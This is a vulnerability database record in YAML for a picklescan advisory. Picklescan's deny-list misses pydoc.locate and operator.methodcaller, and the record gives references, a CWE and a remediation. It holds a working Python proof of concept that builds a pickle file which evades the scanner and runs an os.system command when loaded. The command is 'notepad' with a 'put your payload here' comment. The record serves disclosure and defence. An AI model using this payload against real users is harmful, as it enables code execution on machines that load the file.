vulnerability_id: VCID-4uzj-cxqq-xbaa
aliases:
  - GHSA-84r2-jw7c-4r5q
summary: "Picklescan has Incomplete List of Disallowed Inputs\n### Summary\nCurrently picklescanner\
  \ only blocks some specific functions of the pydoc and operator modules. Attackers can use\
  \ other functions within these allowed modules to go through undetected and achieve RCE on\
  \ the final user. Particularly\n* pydoc.locate: Can dynamically resolve and import arbitrary\
  \ modules (e.g., resolving the string \"os\" to the actual os module).\n* operator.methodcaller:\
  \ Allows executing a method on an object. When combined with a resolved module object, it\
  \ can execute functions like system.\n\nSince locate and methodcaller are not explicitly listed\
  \ in the deny-list, picklescan treats them as \"Safe\" or \"Suspicious\" (depending on configuration)\
  \ but does not flag them as \"Dangerous\", allowing the malicious file to bypass the security\
  \ check.\n\n### PoC\n\nuse the provided script to create a malicious pickle file \n\n```python\n\
  import pickle\nimport pydoc\nimport operator\nimport os\n\nclass ModuleLocator:\n    def __init__(self,\
  \ module_name):\n        self.module_name = module_name\n        \n    def __reduce__(self):\n\
  \        return (pydoc.locate, (self.module_name,))\n\nclass RCEPayload:\n    def __reduce__(self):\n\
  \        \n        cmd = \"notepad\" #put your payload here\n        \n        mc = operator.methodcaller(\"\
  system\", cmd)\n        return (mc, (ModuleLocator(\"os\"),))\n\ndef generate_exploit():\n\
  \    payload = RCEPayload()\n    \n    try:\n        with open(\"bypass.pkl\", \"wb\") as\
  \ f:\n            f.write(pickle.dumps(payload))\n        print(\"File 'bypass.pkl' created.\"\
  )\n    except Exception as e:\n        print(f\"Error: {e}\")\n\nif __name__ == \"__main__\"\
  :\n    generate_exploit()\n```\n\nThe generated payload will not be flagged as dangerous by\
  \ picklescan but is actually malicious. \n\n```python\nimport pickle\nprint(\"Loading bypass.pkl...\"\
  )\npickle.load(open(\"bypass.pkl\", \"rb\"))\n```\n\nScript to open the pickle file, demonstrating\
  \ impact\n\n<img width=\"746\" height=\"341\" alt=\"image\" src=\"https://github.com/user-attachments/assets/2be1b8f9-d467-408d-b1cf-d40b49100cf0\"\
  \ />\n\n\n### Remediation\nThe deny-list for these modules must be upgraded from specific\
  \ functions to a wildcard (*), indicating that any use of these modules is dangerous."
severities:
  - score: HIGH
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/advisories/GHSA-84r2-jw7c-4r5q
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/mmaitre314/picklescan
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/mmaitre314/picklescan/commit/70c1c6c31beb6baaf52c8db1b6c3c0e84a6f9dab
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/mmaitre314/picklescan/pull/53
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/mmaitre314/picklescan/releases/tag/v0.0.33
  - score: HIGH
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/mmaitre314/picklescan/security/advisories/GHSA-84r2-jw7c-4r5q
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/mmaitre314/picklescan/security/advisories/GHSA-84r2-jw7c-4r5q
weaknesses:
  - CWE-184
references:
  - url: https://github.com/mmaitre314/picklescan
    reference_type:
    reference_id:
  - url: https://github.com/mmaitre314/picklescan/commit/70c1c6c31beb6baaf52c8db1b6c3c0e84a6f9dab
    reference_type:
    reference_id:
  - url: https://github.com/mmaitre314/picklescan/pull/53
    reference_type:
    reference_id:
  - url: https://github.com/mmaitre314/picklescan/releases/tag/v0.0.33
    reference_type:
    reference_id:
  - url: https://github.com/mmaitre314/picklescan/security/advisories/GHSA-84r2-jw7c-4r5q
    reference_type:
    reference_id:
  - url: https://github.com/advisories/GHSA-84r2-jw7c-4r5q
    reference_type:
    reference_id: GHSA-84r2-jw7c-4r5q
